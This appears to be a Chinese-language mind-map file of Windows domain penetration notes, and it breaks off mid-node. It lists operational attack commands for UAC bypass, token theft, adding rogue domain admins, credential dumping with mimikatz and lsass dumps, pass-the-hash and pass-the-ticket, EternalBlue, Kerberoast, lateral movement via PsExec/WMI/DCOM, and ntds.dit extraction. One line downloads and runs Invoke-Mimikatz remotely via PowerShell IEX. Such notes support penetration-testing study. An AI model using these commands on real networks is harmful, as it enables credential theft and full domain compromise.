        <node TEXT="Empire中的bypassuac模块" ID="2081736a9f3e3f002" STYLE="fork">
          <node TEXT="bypassuac模块" ID="1541736a9f6f8019" STYLE="fork">
            <node TEXT="usemodule privesc/bypassuac  设置监听器参数，执行execute命令，得到一个新的shell，回到agents下，执行list命令，username一栏中带*号打头的即已bypassuac" ID="1761736a9f839300b" STYLE="fork"/>
          </node>
          <node TEXT="bypassuac_wscript模块" ID="1491736aa02c310ac" STYLE="fork">
            <node TEXT="使用c:\windows\wscript.exe执行payload 即绕过UAC，以管理员权限执行payload。该模块只适用于WIN7，暂无补丁" ID="2af1736aa04c5205d" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="令牌窃取 " ID="9e1736aa25ef902" STYLE="fork">
        <node TEXT="Metasploit" ID="1fb1736aa2cf8813c" STYLE="fork">
          <node TEXT="在已获取 的meterpreter的环境中，输入use incognito命令，然后再输入list_tokens -u命令，列出可用的令牌" ID="cb1736ad45f4110e" STYLE="fork">
            <node TEXT="令牌分两种：Delegation Token即授权令牌，支持交互式登陆；Impersonation Token模拟令牌，支持非交互式会话" ID="2191736b17b160053" STYLE="fork"/>
            <node TEXT="impersonate_token WIN-57123456\\Administrator[这里需要输入两个\\]  再输入shell 进入cmd，执行whoami即为administrator用户了" ID="2e61736b18cd4808e" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="Rotten Potato本地提权" ID="3cd1736b1e3576057" STYLE="fork">
          <node TEXT="在已获取 的meterpreter的环境中，输入use incognito命令，然后再输入list_tokens -u命令，列出可用的令牌" ID="8f1736b327b1808e" STYLE="fork"/>
          <node TEXT="上传rottenpotato.exe至目标服务器，执行execute -HC -f rottenpotato.exe 再执行impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;,再getuid即可发现已经是system权限 了" ID="10f1736b3c827f19" STYLE="fork"/>
        </node>
        <node TEXT="添加域管理员" ID="1b01736b3e3cfe0a7" STYLE="fork">
          <node TEXT="假设网络中设置了域管理进程，在meterpreter会话窗口中输入&quot;ps&quot;命令，查看域管理进程，并使用migrate命令迁移到该进程，输入shell后输入以下命令" ID="37b1736b4151e70fb" STYLE="fork">
            <node TEXT="net user test test /add /domain" ID="3471736b3e4eaf05a" STYLE="fork"/>
            <node TEXT="net group &quot;domain admins&quot; test /add /domain" ID="2731736b4030f0035" STYLE="fork"/>
          </node>
          <node TEXT="在metterpreter环境中，使用incognit来模拟域管理员，然后通过迭代系统 中所有可用的身份令牌来添加域管理员" ID="3251736b410247063" STYLE="fork">
            <node TEXT="add_user test test -h 1.1.1.2" ID="26d1736b4353e80a8" STYLE="fork"/>
            <node TEXT="add_group &quot;Domain Admins&quot; test -h 1.1.1.2" ID="3c61736b43863f007" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="Empire下的令牌窃取" ID="28b1736b6b3eae0ca" STYLE="fork">
          <node TEXT="在Empire下获取服务器权限后，执行mimikatz命令，再输入creds命令，即可查看Empire列举出来 的密码" ID="38f1736b6b725d0e" STYLE="fork"/>
          <node TEXT="执行命令 pth &lt;ID&gt;命令，就能窃取指定id对应用户的令牌[ID为列举出来的CredID]" ID="1ae1736b73df870e5" STYLE="fork"/>
          <node TEXT="执行ps命令，查看当前是否有域用户的进程正在运行，执行steal_token &lt;PID&gt; 即可获取指定进程令牌" ID="3371736b74f29602d" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="无凭证条件下的权限 获取" ID="1651736b9d8bf612" STYLE="fork">
        <node TEXT="LLMNR和NetBIOS" ID="38d1736b9dc23e171" STYLE="fork">
          <node TEXT="Responder[下载链接：https://github.com/SpiderLabs/Responder.git ]" ID="2ad1736b9de68510e" STYLE="fork">
            <node TEXT="python Responder.py -I eth0 -wrf  " ID="281736b9eab360a8" STYLE="fork"/>
          </node>
        </node>
      </node>
    </node>
    <node TEXT="五、域内横向移动" ID="c61735a6ab2da06c" STYLE="bubble" POSITION="right">
      <node TEXT="常用Windows远程连接和相关命令" ID="861736ba08e4d012" STYLE="fork">
        <node TEXT="IPC" ID="1eb1736ba0c145079" STYLE="fork">
          <node TEXT="通过IPC$可以与目标机器 建立连接，不仅可以访问目标机器 中的文件，进行上传下载操作，还可以在目标机器上执行其它命令" ID="3a1736ba12cde185" STYLE="fork"/>
          <node TEXT="net user \\192.168.1.1\ipc$ &quot;password&quot; /user:administrator 再执行net user可查看当前建立的连接" ID="1981736ba1cc3e12c" STYLE="fork"/>
          <node TEXT="IPC$的利用条件" ID="2c01736ba2c407172" STYLE="fork">
            <node TEXT="开启了139、445端口" ID="521736ba2e4560b7" STYLE="fork"/>
            <node TEXT="管理员开启了默认共享" ID="35e1736ba32b2f019" STYLE="fork"/>
          </node>
          <node TEXT="IPC$连接失败的原因" ID="3c41736ba3678e08a" STYLE="fork">
            <node TEXT="用户名或密码错误" ID="1011736ba3860e182" STYLE="fork"/>
            <node TEXT="目标没有打开IPC$默认共享" ID="8f1736ba3a30716b" STYLE="fork"/>
            <node TEXT="不能成功连接目标的139、445端口" ID="f91736ba3d1a5005" STYLE="fork"/>
            <node TEXT="命令输入错误" ID="2131736ba3fade10e" STYLE="fork"/>
          </node>
          <node TEXT="常见错误号" ID="1981736ba40936023" STYLE="fork">
            <node TEXT="5：拒绝访问" ID="38c1736ba41ebe147" STYLE="fork"/>
            <node TEXT="51：无法找到网络路径" ID="3251736ba45225038" STYLE="fork"/>
            <node TEXT="53：找不到网络路径[IP错误，未开机，lanmanserver服务未启动，目标有防火墙]" ID="16f1736ba4780502c" STYLE="fork"/>
            <node TEXT="67：找不到网络名[lanmanserver服务未启动、IPC$被删除]" ID="5a1736ba5282e12" STYLE="fork"/>
            <node TEXT="1219：提供的凭据与已存在的凭据集冲突" ID="1681736ba58925119" STYLE="fork"/>
            <node TEXT="1326：未知的用户名或错误密码" ID="12d1736ba5e19e065" STYLE="fork"/>
            <node TEXT="1792：试图登陆，但网络登陆服务未启动" ID="1c41736ba6048e0b1" STYLE="fork"/>
            <node TEXT="2422：密码已过期" ID="32d1736ba643df114" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="使用Windows自带的工具获取远程主机信息" ID="27c1736ba66575018" STYLE="fork">
          <node TEXT="dir命令" ID="1101736ba6a9b507c" STYLE="fork">
            <node TEXT="在使用net user与目标建立ipc$连接后，可执行命令dir \\192.168.1.1\c$" ID="2291736ba6b7ff055" STYLE="fork"/>
          </node>
          <node TEXT="tasklist命令" ID="3d51736ba779b6186" STYLE="fork">
            <node TEXT="在使用net user与目标建立ipc$连接后，可执行命令tasklist /S 192.168.1.1 -U administrator /P password" ID="3f1736ba78a0f02" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="计划任务" ID="2c01736ba81a1e014" STYLE="fork">
          <node TEXT="at命令" ID="18f1736ba8340e058" STYLE="fork">
            <node TEXT="查看目标时间：net time \\192.168.1.1" ID="1601736ba8504e116" STYLE="fork"/>
            <node TEXT="将文件复制到目标系统中： copy test.exe \\192.168.1.1\c$" ID="551736ba8cb66022" STYLE="fork"/>
            <node TEXT="使用at创建计划任务：at \\192.168.1.1 4:11PM c:\test.exe" ID="1af1736ba92d2506e" STYLE="fork"/>
            <node TEXT="清除at记录：at \\192.168.1.1 7 /delete [7为上一步创建任务时的ID]" ID="20f1736ba9ce86132" STYLE="fork"/>
          </node>
          <node TEXT="schtasks命令" ID="691736baa39e4094" STYLE="fork">
            <node TEXT="schtasks /create /s 192.168.1.1 /tn test /sc onstart /tr c:\test.exe /ru system /f[创建名为test的计划任务，开机时自动启动，程序为c:\test.exe，启动权限为system]" ID="3571736baaa9660b2" STYLE="fork"/>
            <node TEXT="schtasks /run /s 192.168.1.1 /i /tn &quot;test&quot;  执行上一步创建的任务" ID="1121736bad9586117" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="Windows系统Hash获取" ID="1d31736bb056e50ff" STYLE="fork">
        <node TEXT="LM Hash和NTLM Hash" ID="2721736bb0ba9d12b" STYLE="fork">
          <node TEXT="在windows系统中，hash的结构通常为：username:RID:LM-HASH:NT-HASH" ID="1c31736bb0e81604c" STYLE="fork"/>
        </node>
        <node TEXT="单机密码抓取" ID="1351736bb29766197" STYLE="fork">
          <node TEXT="GetPass 获取明文密码" ID="1371736bb2be7d16a" STYLE="fork"/>
          <node TEXT="PwDump7 获取NTLM Hash,通过彩虹表破解，也可以通过pth登陆" ID="1811736bb2f7d5152" STYLE="fork"/>
          <node TEXT="QuarksPwDump" ID="24e1736bb3d18d0fa" STYLE="fork">
            <node TEXT="QuarksPwDump --dump-hash-local" ID="cb1736bb40b8e001" STYLE="fork"/>
          </node>
          <node TEXT="通过SAM和System文件抓取密码" ID="2471736bb4510514f" STYLE="fork">
            <node TEXT="导出SAM和System文件" ID="19e1736bb498ce00e" STYLE="fork">
              <node TEXT="reg save hklm\sam sam.hive" ID="3541736bb4db45193" STYLE="fork"/>
              <node TEXT="reg save hklm\system system.hive" ID="2781736bb506e5039" STYLE="fork"/>
            </node>
            <node TEXT="读取文件" ID="2101736bb54665139" STYLE="fork">
              <node TEXT="mimikatz读取SAM和SYSTEM文件[将导入的hive文件放到本地]" ID="1121736bb563ad166" STYLE="fork">
                <node TEXT="lsadump::sam /sam:sam.hive /system:system.hive" ID="1491736bb5716d06" STYLE="fork"/>
              </node>
              <node TEXT="使用Cain" ID="1131736bb5e32c0bd" STYLE="fork">
                <node TEXT="进入Cracker模块，选中LM&amp;NTLM选项，import Hashes From a SAM database选项" ID="2ba1736bb5fba6051" STYLE="fork"/>
              </node>
              <node TEXT="mimikatz直接读取本地SAM文件" ID="3cf1736bb7315e072" STYLE="fork">
                <node TEXT="privilege::debug" ID="2791736bb7aa96014" STYLE="fork"/>
                <node TEXT="token::elevate" ID="3b81736bb7d4bd112" STYLE="fork"/>
                <node TEXT="lsadump::sam" ID="3d81736bb7f7960db" STYLE="fork"/>
              </node>
              <node TEXT="" ID="1201736bbcf2fd0c9" STYLE="fork"/>
            </node>
          </node>
          <node TEXT="mimikatz读取在线SAM文件" ID="1a51736bb890dd057" STYLE="fork">
            <node TEXT="mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;" ID="2ad1736bb9659d178" STYLE="fork"/>
          </node>
          <node TEXT="mimikatz离线读取lsass.dmp文件" ID="c1736bba76bd188" STYLE="fork">
            <node TEXT="导出lsass.dmp文件" ID="2421736bbaa6cd04f" STYLE="fork">
              <node TEXT="Windows NT 6中，任务管理器中找到lsass.exe进程，右键选择“Create Dump File”" ID="1071736bbae46c192" STYLE="fork"/>
              <node TEXT="Procdump.exe -accepteula -ma lsass.exe lsass.dmp" ID="2db1736bbb77ad003" STYLE="fork"/>
            </node>
            <node TEXT="mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; exit" ID="25f1736bbc05f6157" STYLE="fork"/>
          </node>
          <node TEXT="Powershell 获取Hash" ID="cf1736bbe21ed03b" STYLE="fork">
            <node TEXT="powershell进行nishang目录，Import-Module .\Get-PassHashes.ps1 再执行Get-PassHashes" ID="15f1736bbe52d605" STYLE="fork"/>
          </node>
          <node TEXT="PowerShell远程加载mimikatz抓取Hash" ID="811736bbf93dc0b6" STYLE="fork">
            <node TEXT="powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://is.gd/oeoFuI&apos;); Invoke-Mimikatz -DumpCreds&quot;" ID="501736bbfde650bc" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="使用hashcat破解密码" ID="5a1736bc29bf514e" STYLE="fork"/>
      </node>
      <node TEXT="哈希传递" ID="711736bc44b5d105" STYLE="fork">
        <node TEXT="NTLM Hash哈希传递" ID="2281736bc47bb503e" STYLE="fork">
          <node TEXT="mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:pentest.com /ntlm:htlm_hash&quot;  会弹出新的cmd" ID="281736bc503c5092" STYLE="fork"/>
        </node>
        <node TEXT="AES-256 密钥哈希传递" ID="1511736bc6796507b" STYLE="fork">
          <node TEXT="抓取密钥哈希：mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot;" ID="9d1736bc6df86081" STYLE="fork"/>
          <node TEXT="传递：mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:pentest.com /aes256:AES-256_HASH&quot;" ID="3b01736bc76095139" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="票据传递攻击" ID="1af1736bc881d6048" STYLE="fork">
        <node TEXT="使用mimikatz进行票据传递" ID="1c51736bc8e24d169" STYLE="fork">
          <node TEXT="导出票据：mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot;，执行之后 当前目录会生成多个服务的票据文件，如krbtgt\cifs\ldap等" ID="681736bc90a0e006" STYLE="fork"/>
          <node TEXT="清除内存中的票据：kerberos::purge" ID="3391736bcb59be031" STYLE="fork"/>
          <node TEXT="将票据注入到内存：mimikatz &quot;kerberos::ptt&quot; &quot;c:\ticket\xxxxxxxxxxx-administrator@krbtgt-pentest.com.kirbi&quot;\" ID="41736bcc161d14" STYLE="fork"/>
          <node TEXT="将高权限 票据注入内存后，可以列出远程计算机的文件目录，如：dir \\dc\c$" ID="3c11736bcce8ef0b6" STYLE="fork"/>
        </node>
        <node TEXT="使用kekeo进行票据传递[下载链接：https://github.com/gentilkiwi/kekeo]" ID="2ea1736bcdadad11a" STYLE="fork">
          <node TEXT="生成票据文件：kekeo  &quot;tgt::ask /user:administrator /domain:pentest.com /ntlm:NTLM_HASH&quot;" ID="15f1736bcdd80d0a" STYLE="fork"/>
          <node TEXT="清除内存中的票据：kerberos::purge[在kekeo的shell中]\klist purge[在cmd shell中]" ID="3d61736bcf694607a" STYLE="fork"/>
          <node TEXT="导入内存：[kekeo shell] kerberos::ptt TGT_administrator@pentest.com_krbtgt~pentest.com@pentest.com.kirbi[该文件为第一步中生成的文件名]" ID="581736bcfcc7c198" STYLE="fork"/>
          <node TEXT="输入exit命令退出，再dir \\dc\c$列出远程计算机的文件目录" ID="831736bd194fe15" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="PsExec的使用" ID="2011736bd220f7137" STYLE="fork">
        <node TEXT="PsTools中的PsExec" ID="3251736bdfe125027" STYLE="fork">
          <node TEXT="有建立 ipc$连接的情况下，执行psexec.exe -accepteula \\192.168.1.1 -s cmd.exe 可获取 system权限shell" ID="2671736bd237c504a" STYLE="fork">
            <node TEXT="-accepteula 第一次运行psexec会弹出确认框，加上该参数不弹" ID="3c71736bddd88d027" STYLE="fork"/>
            <node TEXT="-s 以system权限运行远程进程" ID="2851736bde40be09f" STYLE="fork"/>
          </node>
          <node TEXT="没有建立 ipc$连接" ID="2f91736bdea8c50a2" STYLE="fork">
            <node TEXT="psexec \\192.168.1.1 -u administrator -p password cmd.exe" ID="2bc1736bdec984166" STYLE="fork">
              <node TEXT="-u 域名\用户名" ID="14c1736bdf3d050b8" STYLE="fork"/>
              <node TEXT="-p 密码" ID="941736bdf5d2f0c4" STYLE="fork"/>
            </node>
          </node>
        </node>
        <node TEXT="metasploit中的psexec模块" ID="f81736bdfbbe5156" STYLE="fork">
          <node TEXT="exploit/windows/smb/psexec" ID="2e51736be0476d121" STYLE="fork"/>
          <node TEXT="exploit/windows/smb/psexec_psh(psexec的powershell版本)" ID="2b21736be0895c121" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="WMI的使用" ID="2111736be11085088" STYLE="fork">
        <node TEXT="基本命令[wmic命令没有回显，开启防火墙时无法连接]" ID="1701736be3336403b" STYLE="fork">
          <node TEXT="wmic /node:192.168.1.1 /user:administrator /password:admin123 process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;" ID="1d01736be137dc08" STYLE="fork"/>
          <node TEXT="建立IPC$后：type \\192.168.1.1\c$\ip.txt" ID="34d1736be261a50bf" STYLE="fork"/>
        </node>
        <node TEXT="impacket工具包中的wmiexec" ID="c61736be3ae5e18d" STYLE="fork">
          <node TEXT="wmiexec.py administrator:admin123@@192.168.1.1  主要用于linux向windows横向渗透" ID="2741736be3e30d04e" STYLE="fork"/>
        </node>
        <node TEXT="wmiexec.vbs" ID="1cc1736be475dd166" STYLE="fork">
          <node TEXT="cscript.exe //nologo wmiexec.vbs /shell 192.168.1.1 administrator admin123" ID="01736be48794048" STYLE="fork"/>
        </node>
        <node TEXT="Invoke-WmiCommand[PowerSploit工具包中]" ID="c31736be551d5083" STYLE="fork">
          <node TEXT="将Invoke-WmiCommand.ps1导入系统后，在powershell中执行下列命令" ID="dc1736be64a35004" STYLE="fork"/>
          <node TEXT="$User=&quot;pentest.com\administrator&quot;" ID="c81736be6a50501d" STYLE="fork"/>
          <node TEXT="$Password=ConvertTo-SeureString -String &quot;admin123&quot; -AsPlainText -Force" ID="3561736be6f6cc0fc" STYLE="fork"/>
          <node TEXT="$Cred =New-Object -TypeName System.Management.AutoMation.PSCreDential -ArgumentList $User,$Password" ID="b41736be78933098" STYLE="fork"/>
          <node TEXT="$Remote=Invoke-WmiCommand -Payload {ipconfig} -Credential $Cred -ComputerName  192.168.1.1" ID="871736be8444c014" STYLE="fork"/>
          <node TEXT="$Remote.PayloadOutput" ID="34d1736be6d8ad029" STYLE="fork"/>
        </node>
        <node TEXT="Invoke-WMIMethod[Powershell自带]" ID="3391736be95985122" STYLE="fork">
          <node TEXT="$User=&quot;pentest.com\administrator&quot;" ID="1c61736be9761d0ae" STYLE="fork"/>
          <node TEXT="$Password=ConvertTo-SeureString -String &quot;admin123&quot; -AsPlainText -Force" ID="3b01736be9bb8503c" STYLE="fork"/>
          <node TEXT="$Cred =New-Object -TypeName System.Management.AutoMation.PSCreDential -ArgumentList $User,$Password" ID="971736be9e1150a1" STYLE="fork"/>
          <node TEXT="Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;192.168.1.1&quot; -Credential $Cred" ID="2641736bea4d5d09e" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="永恒之蓝" ID="3e31736beb7c8c17c" STYLE="fork">
        <node TEXT="metasploit" ID="831736beb8d7c0be" STYLE="fork">
          <node TEXT="use auxiliary/scanner/smb/smb_ms17_010 检测" ID="3b71736bebd5e6175" STYLE="fork"/>
          <node TEXT="use exploit/windows/smb/ms17_010_eternalblue 利用" ID="1c01736bec5634071" STYLE="fork"/>
        </node>
      </node>
      <node TEXT="smbexec的使用" ID="a41736bed07bc063" STYLE="fork">
        <node TEXT="C++版本smbexec[下载地址：https://github.com/sunorr/smbexec]" ID="18b1736bed1e7c16e" STYLE="fork">
          <node TEXT="将execserver.exe上传到目标系统c:\windows目录下，解除UAC对命令执行的限制，执行以下命令" ID="3d61736bee0e0d07b" STYLE="fork">
            <node TEXT="net user \\192.168.1.1 &quot;admin123&quot; /user:pentest.com\administrator" ID="3e01736bef2bdd0bf" STYLE="fork"/>
            <node TEXT="copy execserver.exe \\192.168.1.1\c$\windows\" ID="3731736bef90e5199" STYLE="fork"/>
          </node>
          <node TEXT="在客户端执行命令" ID="2ef1736befed9d029" STYLE="fork">
            <node TEXT="test.exe 192.168.1.1 administrator admin123 whoami c$" ID="2411736bf048ed09d" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="impacket工具包中的smbexec.py" ID="821736bf0ae1c186" STYLE="fork">
          <node TEXT="smbexec.py pentest.com/administrator:admin123\@192.168.1.1" ID="33d1736bf0e5cc07c" STYLE="fork"/>
        </node>
        <node TEXT="Linux跨Windows远程命令执行[下载地址：https://github.com/brav0hax/smbexec]" ID="1471736bf343750b3" STYLE="fork"/>
      </node>
      <node TEXT="DCOM在远程系统中的使用" ID="1e81736bf46a6d14b" STYLE="fork">
        <node TEXT="通过本地DCOM执行命令" ID="2f91736bf49365067" STYLE="fork">
          <node TEXT="获取DCOM程序列表" ID="1841736bf55cdd0f9" STYLE="fork">
            <node TEXT="Get-CimInstance Win32_DCOMApplication[powershell 3.0+]" ID="771736bf4b05d0ec" STYLE="fork"/>
            <node TEXT="Get-WMIObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication" ID="18c1736bf57ee4144" STYLE="fork"/>
          </node>
          <node TEXT="使用DCOM执行任意命令" ID="e81736bf5e9fc115" STYLE="fork">
            <node TEXT="$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;127.0.0.1&quot;))" ID="1c01736bf60d7c06d" STYLE="fork"/>
            <node TEXT="$com.Document.ActiveView.ExecuteShellCommand(&apos;cmd.exe&apos;,$null,&apos;/c calc.exe&apos;,&quot;Minimzed&quot;)" ID="3121736bf8314d006" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="使用DCOM在远程机器上执行命令" ID="3421736bf9a87416" STYLE="fork">
          <node TEXT="建立 IPC$连接：net user \\192.168.1.1 &quot;admin123&quot; /user:pentest.com\administrator" ID="3651736bfa09ec0b2" STYLE="fork"/>
          <node TEXT="执行命令" ID="3e71736bfaae4405c" STYLE="fork">
            <node TEXT="调用MMC20.Application远程执行命令" ID="1111736bfac3c300d" STYLE="fork">
              <node TEXT="$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;192.168.1.1&quot;))" ID="391736bfb043c0f4" STYLE="fork"/>
              <node TEXT="$com.Document.ActiveView.ExecuteShellCommand(&apos;cmd.exe&apos;,$null,&apos;/c calc.exe&apos;,&quot;Minimzed&quot;)" ID="13c1736bfb16651291" STYLE="fork"/>
            </node>
            <node TEXT="调用9BA05972-F6A8-11CF-A442-00A0C90A8F39远程执行命令" ID="1e81736bfcf2cc065" STYLE="fork">
              <node TEXT="$com=[activator]::CreateInstance([type]::GetTypeFromProgID(&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;,&quot;192.168.1.1&quot;))" ID="3541736bfcf3d40371" STYLE="fork"/>
              <node TEXT="$com.Document.ActiveView.ExecuteShellCommand(&apos;cmd.exe&apos;,$null,&apos;/c calc.exe&apos;,&quot;Minimzed&quot;)" ID="29f1736bfcf3d40b72" STYLE="fork"/>
            </node>
          </node>
        </node>
      </node>
      <node TEXT="SPN在域环境中的应用" ID="3a21736bfd613c08f" STYLE="fork">
        <node TEXT="SPN扫描" ID="3771736bfd802c0cc" STYLE="fork">
          <node TEXT="PowerShell-AD-Recon工具包[下载地址：https://github.com/PyroTek3/PowerShell-AD-Recon]" ID="3da1736bfe9e6701c" STYLE="fork">
            <node TEXT="在域中任一机器 上，以域用户身份运行一个powershell，导入脚本文件并执行" ID="2f01736bffe09c151" STYLE="fork">
              <node TEXT="扫描所有MSSQL服务" ID="ab1736c0198c5057" STYLE="fork">
                <node TEXT="Import-Module .\Discover-PSMSSQLServers.ps1" ID="1541736c02811408b" STYLE="fork"/>
                <node TEXT="Discover-PSMSSQLServers" ID="1fb1736c01074504f" STYLE="fork"/>
              </node>
              <node TEXT="扫描所用SPN信息" ID="121736c015fb30de" STYLE="fork">
                <node TEXT="Import-Module .\Discover-PSInterestingServices.ps1" ID="1b51736c028ddc05a" STYLE="fork"/>
                <node TEXT="Discover-PSInterestingServices" ID="3011736c01dd3d16d" STYLE="fork"/>
              </node>
            </node>
          </node>
          <node TEXT="Windows自带命令" ID="1ef1736c02b82d00b" STYLE="fork">
            <node TEXT="setspn -T domain -q &quot;*/*&quot;" ID="2341736c02d57c00c" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="Kerberoast攻击" ID="3781736c03266b151" STYLE="fork">
          <node TEXT="请求SPN票据，打开powershell" ID="3881736c03520c024" STYLE="fork">
            <node TEXT="Add-Type -AssemblyName System.IdentityModel Net-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/computer1.pentest.com&quot;" ID="2741736c04c44d12b" STYLE="fork"/>
          </node>
          <node TEXT="导出票据，mimikatz" ID="ae1736c05d0d40d8" STYLE="fork">
            <node TEXT="kerberos::list /export" ID="1111736c05fd9408f" STYLE="fork"/>
          </node>
          <node TEXT="使用Kerberoast脚本离线 破解票据[下载地址：https://github.com/nidem/kerberoast ]" ID="2701736c06585d034" STYLE="fork">
            <node TEXT="python tgsrepcrack.py wordlist.txt mssql.kirbi" ID="91736c06a254062" STYLE="fork"/>
          </node>
        </node>
      </node>
      <node TEXT="Exchange邮件服务器安全" ID="2ed1736c07a84c121" STYLE="fork">
        <node TEXT="远程访问接口" ID="3051736c07c2f401" STYLE="fork">
          <node TEXT="owa   web邮箱" ID="13e1736c08845d11a" STYLE="fork"/>
          <node TEXT="eac     exchange管理中心即WEB的控制台" ID="1ce1736c08a07c04b" STYLE="fork"/>
        </node>
        <node TEXT="Exchange服务发现" ID="1541736c08ee8c09" STYLE="fork">
          <node TEXT="基于端口扫描" ID="32b1736c09dddc0f8" STYLE="fork"/>
          <node TEXT="SPN查询 " ID="681736c09f3a4019" STYLE="fork">
            <node TEXT="exchangeRFR\exchangeAB\exchangeMDB\SMTP\sMTPsVC等都是exchange注册的服务" ID="3181736c0ab0ac184" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="基本操作" ID="2581736c0b96b3197" STYLE="fork">
          <node TEXT="查看邮件数据库" ID="2711736c0ba5b4195" STYLE="fork">
            <node TEXT="GetmailboxDatabase -server &quot;Exchange1&quot;" ID="2d01736c0d383c0f" STYLE="fork">
              <node TEXT="powershell环境中默认没有这条命令，需要执行add-pssnapin microsoft.exchange*添加命令" ID="36f1736c0d878c0fe" STYLE="fork"/>
              <node TEXT="指定数据库，查询详细信息" ID="2331736c0e055415" STYLE="fork">
                <node TEXT="GetmailboxDatabase -Identity &apos;Mailbox Database xxxxx&apos;|Format-List Name,EdbFilePath,LogFolderPath [其中Mailbox Database xxxxx为获取到的数据库名]" ID="3be1736c0ec88408d" STYLE="fork"/>
              </node>
            </node>
          </node>
          <node TEXT="获取现有用户的邮件地址" ID="3e41736c0fe9e4146" STYLE="fork">
            <node TEXT="Get-Mailbox | format-Table Name,WindowsEmailAddress" ID="1001736c100d9414" STYLE="fork"/>
          </node>
          <node TEXT="查看指定用户的邮箱 使用信息" ID="3bb1736c107f54035" STYLE="fork">
            <node TEXT="Get-mailboxstatistics -Identity administrator | select DisplayName,itemcount,TotalItemSize,lastlogonTime" ID="9f1736c10aa1c10c" STYLE="fork"/>
          </node>
          <node TEXT="获取用户邮箱 中的邮件数量" ID="3b51736c11a194112" STYLE="fork">
            <node TEXT="Get-mailbox -ResultSize unlimited|get-mailboxStatistics|sort-object totalitemsize -descend" ID="1351736c11cb1c07e" STYLE="fork"/>
          </node>
        </node>
        <node TEXT="导出邮件[不搞APT，这一节没啥用]" ID="2401736c1842fc145" STYLE="fork"/>
      </node>
    </node>
    <node TEXT="六、域控制器安全" ID="e31735a6aca7a067" STYLE="bubble" POSITION="left">
      <node TEXT="使用卷影拷贝提取ntds.dit" ID="81736c4ed67a0ba" STYLE="fork">
        <node TEXT="通过ntdsutil.exe提取ntds.dit" ID="191736c3072ac055" STYLE="fork">
          <node TEXT="创建快照：ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit" ID="2bd1736c30efa40f1" STYLE="fork"/>
          <node TEXT="加载快照：ntdsutil snapshot &quot;mount {GUID}&quot; quit quit  //GUID为上一步生成" ID="3a01736c31da7c133" STYLE="fork"/>
          <node TEXT="复制ntds.dit：copy C:\$SNAP_201802270645_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit  //C:\$SNAP_201802270645_VOLUMEC$为上一步的挂载路径" ID="1481736c3442bc17b" STYLE="fork"/>
          <node TEXT="卸载快照：ntdsutil snapshot &quot;unmount {GUID}&quot; quit quit" ID="cc1736c355c3c026" STYLE="fork"/>
          <node TEXT="查询快照：ntdsutil snapshot &quot;List All&quot; quit quit //卸载快照后，此时应为空" ID="12b1736c35c15311c" STYLE="fork"/>
        </node>
        <node TEXT="利用vssadmin提取ntds.dit" ID="33f1736c3679fb0d9" STYLE="fork">
          <node TEXT="创建C盘的卷影拷贝：vssadmin create shadow /for=c:" ID="ce1736c369dc3071" STYLE="fork"/>
          <node TEXT="复制ntds.dit：copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit c:\ntds.dit   //其中\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12为上一步生成" ID="1fd1736c375bbc08a" STYLE="fork"/>
          <node TEXT="删除快照：vssadmin delete shadows /for=c: /quiet" ID="3b71736c38cb5c161" STYLE="fork"/>
        </node>
        <node TEXT="利用vssown.vbs脚本提取ntds.dit" ID="3bb1736c39161c0b3" STYLE="fork">
          <node TEXT="启动卷影拷贝服务：cscript vssown.vbs /start" ID="691736c3949a3068" STYLE="fork"/>
          <node TEXT="创建C盘的卷影拷贝：cscript vssown.vbs /create C" ID="2601736c3ad67406d" STYLE="fork"/>
          <node TEXT="列出当前的卷影拷由：cscript vssown.vbs /list" ID="e01736c3b55a4146" STYLE="fork"/>
          <node TEXT="复制ntds.dit：copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit c:\ntds.dit   //其中 \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12为上一步中的Device Object项内容" ID="1f31736c3c1e1b01b" STYLE="fork"/>
          <node TEXT="删除卷影拷贝：cscript vssown.vbs /delete {GUID}  //其中的GUID为第三步中的ID项内容" ID="3a1736c3cf104099" STYLE="fork"/>
        </node>
        <node TEXT="使用ntdsutil的IFM创建卷影拷贝" ID="1511736c3db5cc13c" STYLE="fork">
          <node TEXT="在域控服务器上以管理员权限运行以下命令，即会自动复制ntds.dit到c:\test\active directory\文件夹下" ID="3981736c3e0a5b163" STYLE="fork">
